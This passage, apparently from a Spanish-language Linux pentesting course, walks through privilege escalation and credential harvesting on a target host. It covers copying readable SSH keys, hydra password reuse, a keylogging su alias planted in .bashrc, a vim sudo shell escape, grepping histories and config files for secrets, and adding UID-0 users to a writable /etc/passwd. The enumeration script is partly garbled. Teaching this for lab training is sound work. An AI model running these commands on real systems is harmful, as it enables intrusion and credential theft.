# Buscar .ssh con permisos incorrectos:
usuario1@target:~$ find /home -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
usuario1@target:~$ ls -la /home/admin/.ssh/id_rsa
-rw-r--r-- 1 admin admin 1234 Feb 6 10:00 /home/admin/.ssh/id_rsa
# ¡Clave privada legible por todos! (debería ser 600)

# Copiar clave privada:
usuario1@target:~$ cp /home/admin/.ssh/id_rsa /tmp/admin_key
usuario1@target:~$ chmod 600 /tmp/admin_key
usuario1@target:~$ ssh -i /tmp/admin_key admin@localhost

#### 🔍 Técnica 3: Reutilización de Credenciales

# Si conseguiste una contraseña, pruébala con otros usuarios:
www-data@target:~$ su - admin
Password: password123
admin@target:~$

# Probar la misma contraseña para SSH:
atacante@local:~$ hydra -l admin -p password123 target ssh
atacante@local:~$ hydra -l root -p password123 target ssh

#### 🔍 Técnica 4: Keylogging de su/sudo

# Si tienes acceso root temporal, puedes crear alias malicioso:
root@target:~# echo 'alias su="echo \$* > /tmp/.su.log && /bin/su"' >> /home/usuario/.bashrc

# Cuando el usuario haga 'su':
usuario@target:~$ su - admin
Password: secretpass123

# La contraseña NO se guarda así, pero el usuario objetivo SÍ:
root@target:~# cat /tmp/.su.log
- admin
# Puedes monitorear procesos para ver qué usuarios intentan

#### 🔍 Técnica 5: Explotar sudo de otro usuario

# Si otro usuario tiene sudo NOPASSWD para algo explotable:
www-data@target:~$ sudo -l -U admin
User admin may run the following commands:
    (ALL) NOPASSWD: /usr/bin/vim

# Si puedes ejecutar comandos como admin de alguna forma:
www-data@target:~$ sudo -u admin vim -c ':!/bin/sh'
# Esto te da shell como admin

      📁 Archivos Sensibles en Directorios de Usuarios

#### Objetivo: Descubrir información valiosa en homes de usuarios

Los directorios /home/ suelen contener información sensible: credenciales, configuraciones, claves privadas, historiales.

#### 🔍 Archivos Críticos a Buscar

**1. Archivos de configuración SSH:**

atacante@target:~$ find /home -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
atacante@target:~$ find /home -name "authorized_keys" 2>/dev/null
atacante@target:~$ find /home -name "known_hosts" 2>/dev/null
# known_hosts revela otros servidores que el usuario accede

**2. Historiales de comandos:**

atacante@target:~$ cat /home/*/.bash_history
atacante@target:~$ cat /home/*/.zsh_history
atacante@target:~$ cat /home/*/.mysql_history
# Buscar comandos con credenciales:
atacante@target:~$ grep -E 'password|passwd|mysql.*-p' /home/*/.bash_history

**3. Archivos de configuración con credenciales:**

atacante@target:~$ find /home -name ".my.cnf" 2>/dev/null
# Credenciales de MySQL

atacante@target:~$ find /home -name ".pgpass" 2>/dev/null
# Credenciales de PostgreSQL

atacante@target:~$ find /home -name ".netrc" 2>/dev/null
# Credenciales FTP/HTTP

atacante@target:~$ find /home -name "config" 2>/dev/null | xargs grep -l "password"

**4. Tokens y claves de API:**

atacante@target:~$ find /home -name ".aws" -type d 2>/dev/null
# Credenciales AWS

atacante@target:~$ find /home -name ".config" -type d 2>/dev/null
# Configuraciones de aplicaciones

atacante@target:~$ grep -r "api_key\|token\|secret" /home/ 2>/dev/null | head -20

**5. Scripts personalizados:**

atacante@target:~$ find /home -name "*.sh" 2>/dev/null
atacante@target:~$ find /home -name "*.py" 2>/dev/null
# Scripts pueden contener credenciales hardcodeadas

**6. Archivos de backups:**

atacante@target:~$ find /home -name "*.bak" -o -name "*.backup" -o -name "*~" 2>/dev/null
# Backups a menudo tienen versiones antiguas con credenciales

> [!warning] 🎯 Comando All-in-One para Reconocimiento
>            Script rápido para enumerar archivos interesantes:
>
>  # Crear script de enumeración:
>  atacante@target:~$  cat > enum_users.sh  /dev/null
>
> echo -e "\n[+] Historiales con credenciales:"
> grep -h -E 'password|passwd' /home/*/.bash_history 2>/dev/null
>
> echo -e "\n[+] Archivos de configuración:"
> find /home -name ".my.cnf" -o -name ".netrc" -o -name ".pgpass" 2>/dev/null
>
> echo -e "\n[+] Permisos laxos en .ssh:"
> find /home -type f -path "*/.ssh/*" -perm /044 2>/dev/null
> EOF
>
>  atacante@target:~$  bash enum_users.sh

      ✍️ Explotación de /etc/passwd Escribible

#### Vector Crítico: /etc/passwd con permisos de escritura

Si /etc/passwd es escribible por usuarios no privilegiados, puedes crear un usuario root instantáneamente.

#### 🔍 Detección

usuario@target:~$ ls -la /etc/passwd
-rw-rw-r-- 1 root root 1234 Feb  6 10:00 /etc/passwd
# ⚠️ Escribible por el grupo! Si estás en ese grupo...

usuario@target:~$ [ -w /etc/passwd ] && echo "¡ESCRIBIBLE!"
¡ESCRIBIBLE!

#### ⚡ Explotación - Método 1: Usuario con UID 0

# Generar hash de contraseña:
atacante@local:~$ openssl passwd -6 -salt xyz password123
$6$xyz$HaSh3dP4ssW0rD...

# Añadir línea a /etc/passwd:
usuario@target:~$ echo 'hacker:$6$xyz$HaSh3dP4ssW0rD...:0:0:root:/root:/bin/bash' >> /etc/passwd

# Login como hacker:
usuario@target:~$ su hacker
Password: password123
root@target:~# # ¡Root!

#### ⚡ Explotación - Método 2: Usuario Sin Contraseña

# Añadir usuario sin contraseña (campo vacío):
usuario@target:~$ echo 'root2::0:0:root:/root:/bin/bash' >> /etc/passwd

# Login directo sin contraseña:
usuario@target:~$ su root2
root@target:~# # ¡Sin pedir contraseña!

#### ⚡ Explotación - Método 3: Modificar Usuario Existente

# Cambiar UID de tu usuario a 0:
usuario@target:~$ sed -i 's/^usuario:x:[0-9]*:/usuario:x:0:/' /etc/passwd

# Reconectar o ejecutar:
usuario@target:~$ python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@target:~#

> [!warning] 🛡️ Defensa
>             Permisos correctos para /etc/passwd:
>
>              Propietario: root:root
>              Permisos: 644 (-rw-r--r--)
>              Comando de corrección: `chmod 644 /etc/passwd`

  ← Volver al Índice

Módulo: Gestión de Usuarios - Curso de Linux para Pentesting

      **Manuel Fernández Ramos** | Versión 202302 v1.0

---

## 🔗 Navegación y Siguiente Módulo
* 🗂️ [[02 - MODULOS/Prácticas (PoCs)/Linux/00 - Índice del Módulo Linux|Índice General de Linux]]
* ⬅️ Anterior: [[02 - MODULOS/Prácticas (PoCs)/Linux/04 - Curso de Linux - Gestión de Grupos y Sudoers|Módulo 4: Gestión de Grupos y Sudoers]]
* 🔐 Siguiente: [[02 - MODULOS/Prácticas (PoCs)/Linux/06 - Curso de Linux - Permisos, SUID, SGID y Sticky Bit|Módulo 6: Permisos, SUID, SGID y Sticky Bit]]
